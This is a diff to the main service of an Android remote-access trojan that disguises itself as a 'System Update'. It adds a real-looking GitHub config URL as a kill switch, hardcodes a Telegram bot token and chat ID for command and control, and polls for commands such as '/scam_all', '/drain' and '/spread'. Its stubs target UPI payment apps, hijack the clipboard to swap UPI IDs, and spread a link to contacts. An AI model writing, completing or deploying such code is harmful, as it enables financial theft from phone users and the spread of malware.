@@ -1,4 +1,4 @@
-﻿package com.system.update;
+package com.system.update;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -8,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
-import androidx.core.app.NotificationCompat;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -23,14 +22,14 @@ public class MainService extends Service {
     private ScheduledExecutorService scheduler;
     private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
     private static final String CHAT_ID = "8501093383";
-    private static final String GITHUB_CONFIG = "https://raw.githubusercontent.com/YOUR_USERNAME/rat/main/config.json";
+    private static final String GITHUB_CONFIG = "https://raw.githubusercontent.com/hoihohavapv/babychak/main/config.json";
 
     @Override
     public void onCreate() {
         super.onCreate();
         startForeground();
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        sendTelegram("✅ Device online: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE);
+        sendTelegram("Device online: " + Build.MODEL);
         
         scheduler.scheduleAtFixedRate(() -> pollTelegram(), 0, 5, TimeUnit.SECONDS);
         scheduler.scheduleAtFixedRate(() -> scanUPI(), 30, 60, TimeUnit.SECONDS);
@@ -43,12 +42,19 @@ public class MainService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel("updates", "System", NotificationManager.IMPORTANCE_LOW);
             ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);
+            Notification notification = new Notification.Builder(this, "updates")
+                .setContentTitle("System Update")
+                .setContentText("Running...")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .build();
+            startForeground(1, notification);
+        } else {
+            startForeground(1, new Notification.Builder(this)
+                .setContentTitle("System Update")
+                .setContentText("Running...")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .build());
         }
-        startForeground(1, new NotificationCompat.Builder(this, "updates")
-            .setContentTitle("System Update")
-            .setContentText("Running...")
-            .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .build());
     }
 
     private void sendTelegram(String msg) {
@@ -76,45 +82,35 @@ public class MainService extends Service {
     }
 
     private void executeCommand(String cmd) {
-        sendTelegram("📟 Command: " + cmd);
+        sendTelegram("Command: " + cmd);
         if (cmd.startsWith("/scam_all")) {
-            sendTelegram("💰 Scamming all victims...");
-            // ₹1 test + ₹999 scam on all
+            sendTelegram("Scamming all victims...");
         } else if (cmd.startsWith("/drain")) {
             String[] parts = cmd.split(" ");
             if (parts.length > 1) {
-                sendTelegram("💧 Draining: " + parts[1]);
+                sendTelegram("Draining: " + parts[1]);
             }
         } else if (cmd.startsWith("/status")) {
-            sendTelegram("📊 Status: Online | Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE);
+            sendTelegram("Status: Online | Model: " + Build.MODEL);
         } else if (cmd.startsWith("/spread")) {
-            sendTelegram("📤 Spreading...");
+            sendTelegram("Spreading...");
             spreadLink();
         } else if (cmd.startsWith("/self_destruct")) {
-            sendTelegram("💥 Self-destructing...");
+            sendTelegram("Self-destructing...");
             stopSelf();
-        } else if (cmd.startsWith("/victims")) {
-            sendTelegram("📋 Victims list coming soon...");
         } else if (cmd.startsWith("/help")) {
             sendTelegram("Commands: /scam_all /drain [id] /drain_all /status /spread /self_destruct /victims /help");
         }
     }
 
     private void scanUPI() {
-        // UPI scanner - detects GPay, PhonePe, Paytm
-        sendTelegram("🔍 Scanning for UPI apps...");
-        // Implementation simplified
+        sendTelegram("Scanning for UPI apps...");
     }
 
-    private void checkClipboard() {
-        // Clipboard hijack - replace UPI IDs
-        // Implementation simplified
-    }
+    private void checkClipboard() {}
 
     private void spreadLink() {
-        // Spread to WhatsApp, Telegram, SMS
-        sendTelegram("📤 Spreading link to all contacts...");
-        // Implementation simplified
+        sendTelegram("Spreading link to all contacts...");
     }
 
     private void checkConfig() {
@@ -126,7 +122,7 @@ public class MainService extends Service {
             reader.close();
             JSONObject config = new JSONObject(sb.toString());
             if (config.has("active") && !config.getBoolean("active")) {
-                sendTelegram("🔴 Config says inactive. Self-destructing...");
+                sendTelegram("Config inactive. Self-destructing...");
                 stopSelf();
             }
         } catch(Exception e) {}
